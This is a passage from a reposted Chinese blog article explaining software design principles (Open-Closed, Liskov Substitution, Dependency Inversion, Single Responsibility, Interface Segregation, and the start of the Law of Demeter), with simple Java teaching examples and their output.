        <content type="html"><![CDATA[<p>曾经拜读过软件设计的几个原则，对于这些原则的理解停留在表面，工作中很少去思考和应用这些原则。随着项目的复杂度的增加和开发人员的增加， 软件设计需要遵循一定的原则以保证项目的顺利进行，降低维护成本，增加软件的可持续性开发性。今天重温一下这些设计原则，文章转自<a href="https://www.cnblogs.com/cainiao-chuanqi/p/10959800.html">软件设计的七大原则</a>, 作者是<strong>菜鸟-传奇</strong>。这篇文章里不仅介绍了软件设计原则的定义和优点还有具体的列子，看例子能帮助我们深入理解和学习如何运用这些原则。 以下为原文的内容。</p><p>在软件开发中，为了提高软件系统的可维护性和可复用性，增加软件的可扩展性和灵活性，程序员要尽量根据 7 条原则来开发程序，从而提高软件开发效率、节约软件开发成本和维护成本。我来依次来总结这 7 条原则。</p><p>这 7 种设计原则是软件设计模式必须尽量遵循的原则，各种原则要求的侧重点不同。其中，<strong>开闭原则是总纲，它告诉我们要对扩展开放，对修改关闭；里氏替换原则告诉我们不要破坏继承体系；依赖倒置原则告诉我们要面向接口编程；单一职责原则告诉我们实现类要职责单一；接口隔离原则告诉我们在设计接口的时候要精简单一；迪米特法则告诉我们要降低耦合度；合成复用原则告诉我们要优先使用组合或者聚合关系复用，少用继承关系复用。</strong></p><h1 id="1-开闭原则"><a href="#1-开闭原则" class="headerlink" title="1 开闭原则"></a>1 开闭原则</h1><h4 id="开闭原则的定义"><a href="#开闭原则的定义" class="headerlink" title="开闭原则的定义"></a>开闭原则的定义</h4><p>开闭原则（Open Closed Principle，OCP）由勃兰特·梅耶（Bertrand Meyer）提出，他在 1988 年的著作《面向对象软件构造》（Object Oriented Software Construction）中提出：软件实体应当对扩展开放，对修改关闭（Software entities should be open for extension，but closed for modification），这就是开闭原则的经典定义。</p><p>这里的软件实体包括以下几个部分：</p><ol><li>项目中划分出的模块</li><li>类与接口</li><li>方法</li></ol><p>开闭原则的含义是：当应用的需求改变时，在不修改软件实体的源代码或者二进制代码的前提下，可以扩展模块的功能，使其满足新的需求。</p><h4 id="开闭原则的作用"><a href="#开闭原则的作用" class="headerlink" title="开闭原则的作用"></a>开闭原则的作用</h4><p>开闭原则是面向对象程序设计的终极目标，它使软件实体拥有一定的适应性和灵活性的同时具备稳定性和延续性。具体来说，其作用如下。</p><ol><li>对软件测试的影响<br>软件遵守开闭原则的话，软件测试时只需要对扩展的代码进行测试就可以了，因为原有的测试代码仍然能够正常运行。</li><li>可以提高代码的可复用性<br>粒度越小，被复用的可能性就越大；在面向对象的程序设计中，根据原子和抽象编程可以提高代码的可复用性。</li><li>可以提高软件的可维护性<br>遵守开闭原则的软件，其稳定性高和延续性强，从而易于扩展和维护。</li></ol><h4 id="开闭原则的实现方法"><a href="#开闭原则的实现方法" class="headerlink" title="开闭原则的实现方法"></a>开闭原则的实现方法</h4><blockquote><p>可以通过“抽象约束、封装变化”来实现开闭原则，即通过接口或者抽象类为软件实体定义一个相对稳定的抽象层，而将相同的可变因素封装在相同的具体实现类中。</p><p>因为抽象灵活性好，适应性广，只要抽象的合理，可以基本保持软件架构的稳定。而软件中易变的细节可以从抽象派生来的实现类来进行扩展，当软件需要发生变化时，只需要根据需求重新派生一个实现类来扩展就可以了。</p></blockquote><p>下面以 Windows 的桌面主题为例介绍开闭原则的应用。<br>【例1】Windows 的桌面主题设计。</p><p>分析：Windows 的主题是桌面背景图片、窗口颜色和声音等元素的组合。用户可以根据自己的喜爱更换自己的桌面主题，也可以从网上下载新的主题。这些主题有共同的特点，可以为其定义一个抽象类（Abstract Subject），而每个具体的主题（Specific Subject）是其子类。用户窗体可以根据需要选择或者增加新的主题，而不需要修改原代码，所以它是满足开闭原则的，其类图如图 1 所示。<br>Windows的桌面主题类图<br><img src="https://upload-images.jianshu.io/upload_images/15531792-aad3d694687d9a07.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h1 id="2-里氏替换原则"><a href="#2-里氏替换原则" class="headerlink" title="2 里氏替换原则"></a>2 里氏替换原则</h1><h4 id="里氏替换原则的定义"><a href="#里氏替换原则的定义" class="headerlink" title="里氏替换原则的定义"></a>里氏替换原则的定义</h4><p>里氏替换原则（Liskov Substitution Principle，LSP）由麻省理工学院计算机科学实验室的里斯科夫（Liskov）女士在 1987 年的“面向对象技术的高峰会议”（OOPSLA）上发表的一篇文章《数据抽象和层次》（Data Abstraction and Hierarchy）里提出来的，她提出：继承必须确保超类所拥有的性质在子类中仍然成立（Inheritance should ensure that any property proved about supertype objects also holds for subtype objects）。</p><p>里氏替换原则主要阐述了有关继承的一些原则，也就是什么时候应该使用继承，什么时候不应该使用继承，以及其中蕴含的原理。里氏替换原是继承复用的基础，它反映了基类与子类之间的关系，是对开闭原则的补充，是对实现抽象化的具体步骤的规范。</p><h4 id="里氏替换原则的作用"><a href="#里氏替换原则的作用" class="headerlink" title="里氏替换原则的作用"></a>里氏替换原则的作用</h4><p>里氏替换原则的主要作用如下。</p><p>里氏替换原则是实现开闭原则的重要方式之一。<br>它克服了继承中重写父类造成的可复用性变差的缺点。<br>它是动作正确性的保证。即类的扩展不会给已有的系统引入新的错误，降低了代码出错的可能性。</p><h4 id="里氏替换原则的实现方法"><a href="#里氏替换原则的实现方法" class="headerlink" title="里氏替换原则的实现方法"></a>里氏替换原则的实现方法</h4><blockquote><p>里氏替换原则通俗来讲就是：子类可以扩展父类的功能，但不能改变父类原有的功能。也就是说：子类继承父类时，除添加新的方法完成新增功能外，尽量不要重写父类的方法。</p><p>如果通过重写父类的方法来完成新的功能，这样写起来虽然简单，但是整个继承体系的可复用性会比较差，特别是运用多态比较频繁时，程序运行出错的概率会非常大。</p><p>如果程序违背了里氏替换原则，则继承类的对象在基类出现的地方会出现运行错误。这时其修正方法是：取消原来的继承关系，重新设计它们之间的关系。</p><p>关于里氏替换原则的例子，最有名的是“正方形不是长方形”。当然，生活中也有很多类似的例子，例如，企鹅、鸵鸟和几维鸟从生物学的角度来划分，它们属于鸟类；但从类的继承关系来看，由于它们不能继承“鸟”会飞的功能，所以它们不能定义成“鸟”的子类。同样，由于“气球鱼”不会游泳，所以不能定义成“鱼”的子类；“玩具炮”炸不了敌人，所以不能定义成“炮”的子类等。</p></blockquote><p>下面以“几维鸟不是鸟”为例来说明里氏替换原则。<br>【例2】里氏替换原则在“几维鸟不是鸟”实例中的应用。</p><p>分析：鸟一般都会飞行，如燕子的飞行速度大概是每小时 120 千米。但是新西兰的几维鸟由于翅膀退化无法飞行。假如要设计一个实例，计算这两种鸟飞行 300 千米要花费的时间。显然，拿燕子来测试这段代码，结果正确，能计算出所需要的时间；但拿几维鸟来测试，结果会发生“除零异常”或是“无穷大”，明显不符合预期，其类图如图 1 所示。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-7ce3e89fa8c78f1c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>程序代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">package principle;</span><br><span class="line">public class LSPtest</span><br><span class="line">&#123;</span><br><span class="line">    public static void main(String[] args)</span><br><span class="line">    &#123;</span><br><span class="line">        Bird bird1&#x3D;new Swallow();</span><br><span class="line">        Bird bird2&#x3D;new BrownKiwi();</span><br><span class="line">        bird1.setSpeed(120);</span><br><span class="line">        bird2.setSpeed(120);</span><br><span class="line">        System.out.println(&quot;如果飞行300公里：&quot;);</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(&quot;燕子将飞行&quot;+bird1.getFlyTime(300)+&quot;小时.&quot;);</span><br><span class="line">            System.out.println(&quot;几维鸟将飞行&quot;+bird2.getFlyTime(300)+&quot;小时。&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        catch(Exception err)</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(&quot;发生错误了!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;鸟类</span><br><span class="line">class Bird</span><br><span class="line">&#123;</span><br><span class="line">    double flySpeed;</span><br><span class="line">    public void setSpeed(double speed)</span><br><span class="line">    &#123;</span><br><span class="line">        flySpeed&#x3D;speed;</span><br><span class="line">    &#125;</span><br><span class="line">    public double getFlyTime(double distance)</span><br><span class="line">    &#123;</span><br><span class="line">        return(distance&#x2F;flySpeed);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;燕子类</span><br><span class="line">class Swallow extends Bird&#123;&#125;</span><br><span class="line">&#x2F;&#x2F;几维鸟类</span><br><span class="line">class BrownKiwi extends Bird</span><br><span class="line">&#123;</span><br><span class="line">    public void setSpeed(double speed)</span><br><span class="line">    &#123;</span><br><span class="line">           flySpeed&#x3D;0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序的运行结果如下：</p><blockquote><p>如果飞行300公里：<br>燕子将飞行2.5小时.<br>几维鸟将飞行Infinity小时。</p></blockquote><blockquote><p>程序运行错误的原因是：几维鸟类重写了鸟类的 setSpeed(double speed) 方法，这违背了里氏替换原则。正确的做法是：取消几维鸟原来的继承关系，定义鸟和几维鸟的更一般的父类，如动物类，它们都有奔跑的能力。几维鸟的飞行速度虽然为 0，但奔跑速度不为 0，可以计算出其奔跑 300 千米所要花费的时间。</p></blockquote><p>其类图如图 2 所示。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-f1b71fc9f82ea891.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h1 id="3-依赖倒置原则"><a href="#3-依赖倒置原则" class="headerlink" title="3 依赖倒置原则"></a>3 依赖倒置原则</h1><h4 id="依赖导致原则的定义"><a href="#依赖导致原则的定义" class="headerlink" title="依赖导致原则的定义"></a>依赖导致原则的定义</h4><p>依赖倒置原则（Dependence Inversion Principle，DIP）是 Object Mentor 公司总裁罗伯特·马丁（Robert C.Martin）于 1996 年在 C++ Report 上发表的文章。</p><p>依赖倒置原则的原始定义为：高层模块不应该依赖低层模块，两者都应该依赖其抽象；抽象不应该依赖细节，细节应该依赖抽象（High level modules shouldnot depend upon low level modules.Both should depend upon abstractions.Abstractions should not depend upon details. Details should depend upon abstractions）。其核心思想是：要面向接口编程，不要面向实现编程。</p><p>依赖倒置原则是实现开闭原则的重要途径之一，它降低了客户与实现模块之间的耦合。</p><p>由于在软件设计中，细节具有多变性，而抽象层则相对稳定，因此以抽象为基础搭建起来的架构要比以细节为基础搭建起来的架构要稳定得多。这里的抽象指的是接口或者抽象类，而细节是指具体的实现类。</p><p>使用接口或者抽象类的目的是制定好规范和契约，而不去涉及任何具体的操作，把展现细节的任务交给它们的实现类去完成。</p><h4 id="依赖导致原则的作用"><a href="#依赖导致原则的作用" class="headerlink" title="依赖导致原则的作用"></a>依赖导致原则的作用</h4><p>依赖倒置原则的主要作用如下。</p><ul><li>依赖倒置原则可以降低类间的耦合性。</li><li>依赖倒置原则可以提高系统的稳定性。</li><li>依赖倒置原则可以减少并行开发引起的风险。</li><li>依赖倒置原则可以提高代码的可读性和可维护性。</li></ul><h4 id="依赖导致原则的实现方法"><a href="#依赖导致原则的实现方法" class="headerlink" title="依赖导致原则的实现方法"></a>依赖导致原则的实现方法</h4><blockquote><p>依赖倒置原则的目的是通过要面向接口的编程来降低类间的耦合性，所以我们在实际编程中只要遵循以下4点，就能在项目中满足这个规则。</p><ul><li>每个类尽量提供接口或抽象类，或者两者都具备。</li><li>变量的声明类型尽量是接口或者是抽象类。</li><li>任何类都不应该从具体类派生。</li><li>使用继承时尽量遵循里氏替换原则。</li></ul></blockquote><p>下面以“顾客购物程序”为例来说明依赖倒置原则的应用。<br>例1】依赖倒置原则在“顾客购物程序”中的应用。</p><p>分析：本程序反映了 “顾客类”与“商店类”的关系。商店类中有 sell() 方法，顾客类通过该方法购物以下代码定义了顾客类通过韶关网店 ShaoguanShop 购物：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class Customer</span><br><span class="line">&#123;</span><br><span class="line">public void shopping(ShaoguanShop shop)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;购物</span><br><span class="line">System.out.println（shop.sell());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，这种设计存在缺点，如果该顾客想从另外一家商店（如婺源网店 WuyuanShop）购物，就要将该顾客的代码修改如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class Customer</span><br><span class="line">&#123;</span><br><span class="line">public void shopping(WuyuanShop shop)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;购物</span><br><span class="line">System.out.println(shop.sell());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>顾客每更换一家商店，都要修改一次代码，这明显违背了开闭原则。存在以上缺点的原因是：顾客类设计时同具体的商店类绑定了，这违背了依赖倒置原则。解决方法是：定义“婺源网店”和“韶关网店”的共同接口 Shop，顾客类面向该接口编程，其代码修改如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class Customer</span><br><span class="line">&#123;</span><br><span class="line">public void shopping(Shop shop)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;购物</span><br><span class="line">System.out.println(shop.sell());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，不管顾客类 Customer 访问什么商店，或者增加新的商店，都不需要修改原有代码了，其类图如图 1 所示.<br>顾客购物程序的类图<br><img src="https://upload-images.jianshu.io/upload_images/15531792-b8a725d618288860.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>程序代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">package principle;</span><br><span class="line">public class DIPtest</span><br><span class="line">&#123;</span><br><span class="line">public static void main(String[] args)</span><br><span class="line">&#123;</span><br><span class="line">Customer wang&#x3D;new Customer();</span><br><span class="line">System.out.println(&quot;顾客购买以下商品：&quot;); </span><br><span class="line">wang.shopping(new ShaoguanShop()); </span><br><span class="line">wang.shopping(new WuyuanShop());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;商店</span><br><span class="line">interface Shop</span><br><span class="line">&#123;</span><br><span class="line">public String sell(); &#x2F;&#x2F;卖</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;韶关网店</span><br><span class="line">class ShaoguanShop implements Shop</span><br><span class="line">&#123;</span><br><span class="line">public String sell()</span><br><span class="line">&#123;</span><br><span class="line">return &quot;韶关土特产：香菇、木耳……&quot;; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;婺源网店</span><br><span class="line">class WuyuanShop implements Shop</span><br><span class="line">&#123;</span><br><span class="line">public String sell()</span><br><span class="line">&#123;</span><br><span class="line">return &quot;婺源土特产：绿茶、酒糟鱼……&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">&#x2F;&#x2F;顾客</span><br><span class="line">class Customer</span><br><span class="line">&#123;</span><br><span class="line">public void shopping(Shop shop)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;购物</span><br><span class="line">System.out.println(shop.sell()); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序的运行结果如下：</p><blockquote><p>顾客购买以下商品：<br>韶关土特产：香菇、木耳……<br>婺源土特产：绿茶、酒糟鱼……</p></blockquote><h1 id="4-单一职责原则"><a href="#4-单一职责原则" class="headerlink" title="4 单一职责原则"></a>4 单一职责原则</h1><h4 id="单一职责原则的定义"><a href="#单一职责原则的定义" class="headerlink" title="单一职责原则的定义"></a>单一职责原则的定义</h4><p>单一职责原则（Single Responsibility Principle，SRP）又称单一功能原则，由罗伯特·C.马丁（Robert C. Martin）于《敏捷软件开发：原则、模式和实践》一书中提出的。这里的职责是指类变化的原因，单一职责原则规定一个类应该有且仅有一个引起它变化的原因，否则类应该被拆分（There should never be more than one reason for a class to change）。</p><p>该原则提出对象不应该承担太多职责，如果一个对象承担了太多的职责，至少存在以下两个缺点：</p><ul><li>一个职责的变化可能会削弱或者抑制这个类实现其他职责的能力；</li><li>当客户端需要该对象的某一个职责时，不得不将其他不需要的职责全都包含进来，从而造成冗余代码或代码的浪费。</li></ul><h4 id="单一职责原则的优点"><a href="#单一职责原则的优点" class="headerlink" title="单一职责原则的优点"></a>单一职责原则的优点</h4><p>单一职责原则的核心就是控制类的粒度大小、将对象解耦、提高其内聚性。如果遵循单一职责原则将有以下优点。</p><ul><li>降低类的复杂度。一个类只负责一项职责，其逻辑肯定要比负责多项职责简单得多。</li><li>提高类的可读性。复杂性降低，自然其可读性会提高。</li><li>提高系统的可维护性。可读性提高，那自然更容易维护了。</li><li>变更引起的风险降低。变更是必然的，如果单一职责原则遵守得好，当修改一个功能时，可以显著降低对其他功能的影响。</li></ul><h4 id="单一职责原则的实现方法"><a href="#单一职责原则的实现方法" class="headerlink" title="单一职责原则的实现方法"></a>单一职责原则的实现方法</h4><blockquote><p>单一职责原则是最简单但又最难运用的原则，需要设计人员发现类的不同职责并将其分离，再封装到不同的类或模块中。而发现类的多重职责需要设计人员具有较强的分析设计能力和相关重构经验。下面以大学学生工作管理程序为例介绍单一职责原则的应用。</p></blockquote><p>【例1】大学学生工作管理程序。<br>分析：大学学生工作主要包括学生生活辅导和学生学业指导两个方面的工作，其中生活辅导主要包括班委建设、出勤统计、心理辅导、费用催缴、班级管理等工作，学业指导主要包括专业引导、学习辅导、科研指导、学习总结等工作。如果将这些工作交给一位老师负责显然不合理，正确的做 法是生活辅导由辅导员负责，学业指导由学业导师负责，其类图如图 1 所示。<br>大学学生工作管理程序的类图<br><img src="https://upload-images.jianshu.io/upload_images/15531792-b8ea965ee53630dd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><code>注意：单一职责同样也适用于方法。一个方法应该尽可能做好一件事情。如果一个方法处理的事情太多，其颗粒度会变得很粗，不利于重用。</code></p><h1 id="5-接口隔离原则"><a href="#5-接口隔离原则" class="headerlink" title="5 接口隔离原则"></a>5 接口隔离原则</h1><h4 id="接口隔离原则的定义"><a href="#接口隔离原则的定义" class="headerlink" title="接口隔离原则的定义"></a>接口隔离原则的定义</h4><p>接口隔离原则（Interface Segregation Principle，ISP）要求程序员尽量将臃肿庞大的接口拆分成更小的和更具体的接口，让接口中只包含客户感兴趣的方法。</p><p>2002 年罗伯特·C.马丁给“接口隔离原则”的定义是：客户端不应该被迫依赖于它不使用的方法（Clients should not be forced to depend on methods they do not use）。该原则还有另外一个定义：一个类对另一个类的依赖应该建立在最小的接口上（The dependency of one class to another one should depend on the smallest possible interface）。</p><p>以上两个定义的含义是：要为各个类建立它们需要的专用接口，而不要试图去建立一个很庞大的接口供所有依赖它的类去调用。</p><p>接口隔离原则和单一职责都是为了提高类的内聚性、降低它们之间的耦合性，体现了封装的思想，但两者是不同的：</p><ul><li>单一职责原则注重的是职责，而接口隔离原则注重的是对接口依赖的隔离。</li><li>单一职责原则主要是约束类，它针对的是程序中的实现和细节；接口隔离原则主要约束接口，主要针对抽象和程序整体框架的构建。</li></ul><h4 id="接口隔离原则的优点"><a href="#接口隔离原则的优点" class="headerlink" title="接口隔离原则的优点"></a>接口隔离原则的优点</h4><p>接口隔离原则是为了约束接口、降低类对接口的依赖性，遵循接口隔离原则有以下 5 个优点。</p><ul><li>将臃肿庞大的接口分解为多个粒度小的接口，可以预防外来变更的扩散，提高系统的灵活性和可维护性。</li><li>接口隔离提高了系统的内聚性，减少了对外交互，降低了系统的耦合性。</li><li>如果接口的粒度大小定义合理，能够保证系统的稳定性；但是，如果定义过小，则会造成接口数量过多，使设计复杂化；如果定义太大，灵活性降低，无法提供定制服务，给整体项目带来无法预料的风险。</li><li>使用多个专门的接口还能够体现对象的层次，因为可以通过接口的继承，实现对总接口的定义。</li><li>能减少项目工程中的代码冗余。过大的大接口里面通常放置许多不用的方法，当实现这个接口的时候，被迫设计冗余的代码。</li></ul><h4 id="接口隔离原则的实现方法"><a href="#接口隔离原则的实现方法" class="headerlink" title="接口隔离原则的实现方法"></a>接口隔离原则的实现方法</h4><blockquote><p>在具体应用接口隔离原则时，应该根据以下几个规则来衡量。</p><ul><li>接口尽量小，但是要有限度。一个接口只服务于一个子模块或业务逻辑。</li></ul></blockquote><ul><li>为依赖接口的类定制服务。只提供调用者需要的方法，屏蔽不需要的方法。</li><li>了解环境，拒绝盲从。每个项目或产品都有选定的环境因素，环境不同，接口拆分的标准就不同深入了解业务逻辑。</li><li>提高内聚，减少对外交互。使接口用最少的方法去完成最多的事情。</li></ul><p>下面以学生成绩管理程序为例介绍接口隔离原则的应用。<br>例1】学生成绩管理程序。</p><p>分析：学生成绩管理程序一般包含插入成绩、删除成绩、修改成绩、计算总分、计算均分、打印成绩信息、査询成绩信息等功能，如果将这些功能全部放到一个接口中显然不太合理，正确的做法是将它们分别放在输入模块、统计模块和打印模块等 3 个模块中，其类图如图 1 所示。<br>学生成绩管理程序的类图<br><img src="https://upload-images.jianshu.io/upload_images/15531792-22bdb5404da8b4dd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">package principle;</span><br><span class="line">public class ISPtest</span><br><span class="line">&#123;</span><br><span class="line">public static void main(String[] args)</span><br><span class="line">&#123;</span><br><span class="line">InputModule input &#x3D;StuScoreList.getInputModule();</span><br><span class="line">CountModule count &#x3D;StuScoreList.getCountModule();</span><br><span class="line">PrintModule print &#x3D;StuScoreList.getPrintModule();</span><br><span class="line">input.insert();</span><br><span class="line">count.countTotalScore();</span><br><span class="line">print.printStuInfo();</span><br><span class="line">&#x2F;&#x2F;print.delete();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;输入模块接口</span><br><span class="line">interface InputModule</span><br><span class="line">&#123;</span><br><span class="line">void insert();</span><br><span class="line">void delete();</span><br><span class="line">void modify();</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;统计模块接口</span><br><span class="line">interface CountModule</span><br><span class="line">&#123;</span><br><span class="line">void countTotalScore();</span><br><span class="line">void countAverage();</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;打印模块接口</span><br><span class="line">interface PrintModule</span><br><span class="line">&#123;</span><br><span class="line">void printStuInfo();</span><br><span class="line">void queryStuInfo();</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;实现类</span><br><span class="line">class StuScoreList implements InputModule,CountModule,PrintModule</span><br><span class="line">&#123;</span><br><span class="line">private StuScoreList()&#123;&#125;</span><br><span class="line">public static InputModule getInputModule()</span><br><span class="line">&#123;</span><br><span class="line">return (InputModule)new StuScoreList();</span><br><span class="line">&#125;</span><br><span class="line">public static CountModule getCountModule()</span><br><span class="line">&#123;</span><br><span class="line">return (CountModule)new StuScoreList();</span><br><span class="line">&#125;</span><br><span class="line">public static PrintModule getPrintModule()</span><br><span class="line">&#123;</span><br><span class="line">return (PrintModule)new StuScoreList();</span><br><span class="line">&#125;</span><br><span class="line">public void insert()</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(&quot;输入模块的insert()方法被调用！&quot;);</span><br><span class="line">&#125;</span><br><span class="line">public void delete()</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(&quot;输入模块的delete()方法被调用！&quot;);</span><br><span class="line">&#125;</span><br><span class="line">public void modify()</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(&quot;输入模块的modify()方法被调用！&quot;);</span><br><span class="line">&#125;</span><br><span class="line">public void countTotalScore()</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(&quot;统计模块的countTotalScore()方法被调用！&quot;);</span><br><span class="line">&#125;</span><br><span class="line">public void countAverage()</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(&quot;统计模块的countAverage()方法被调用！&quot;);</span><br><span class="line">&#125;</span><br><span class="line">public void printStuInfo()</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(&quot;打印模块的printStuInfo()方法被调用！&quot;);</span><br><span class="line">&#125;</span><br><span class="line">public void queryStuInfo()</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(&quot;打印模块的queryStuInfo()方法被调用！&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序的运行结果如下：</p><blockquote><p>输入模块的insert()方法被调用！<br>统计模块的countTotalScore()方法被调用！<br>打印模块的printStuInfo()方法被调用！</p></blockquote><h1 id="6-迪米特法则"><a href="#6-迪米特法则" class="headerlink" title="6 迪米特法则"></a>6 迪米特法则</h1><h4 id="迪米特法则的定义"><a href="#迪米特法则的定义" class="headerlink" title="迪米特法则的定义"></a>迪米特法则的定义</h4><p>迪米特法则（Law of Demeter，LoD）又叫作最少知识原则（Least Knowledge Principle，LKP)，产生于 1987 年美国东北大学（Northeastern University）的一个名为迪米特（Demeter）的研究项目，由伊恩·荷兰（Ian Holland）提出，被 UML 创始者之一的布奇（Booch）普及，后来又因为在经典著作《程序员修炼之道》（The Pragmatic Programmer）提及而广为人知。</p><p>迪米特法则的定义是：只与你的直接朋友交谈，不跟“陌生人”说话（Talk only to your immediate friends and not to 